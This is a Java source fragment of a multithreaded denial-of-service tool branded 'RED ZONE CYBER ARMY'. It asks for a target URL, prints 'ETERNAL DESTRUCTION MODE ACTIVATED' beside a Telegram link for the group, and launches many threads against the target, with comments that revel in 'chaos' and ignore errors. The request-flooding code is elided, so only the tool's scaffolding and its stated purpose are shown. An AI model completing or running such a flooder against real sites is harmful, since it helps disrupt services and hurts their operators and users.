...
public class EternalDestruction implements Runnable {
    ...
    public EternalDestruction(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }
    ...
    public void run() {
        try {
            ...
            // Do nothing, we don't care about errors in our pursuit of chaos!
        }
    }
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("\u001B[35m ********************> RED ZONE CYBER ARMY <********************* \u001B[35m"+'\n'+" \u001B[35m ENTER Target URL:\u001B[35m");
        url = in.nextLine();
        System.out.println("\n");
        ...
        System.out.println("\u001B[34m ETERNAL DESTRUCTION MODE ACTIVATED - Our Telegram : t.me/OXiZ3N");
        System.out.println("\n");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new EternalDestruction(i, ioption));
            t.start();
            threads.add(t);
        }
        ...
        for (int i = 0; i < threads.size(); i++) {
            ...
            try {
                ...
                // Again, we don't care about errors. The show must go on!
            }
        }
        System.out.println("Main Thread ended, but the chaos is eternal!");
    }
}
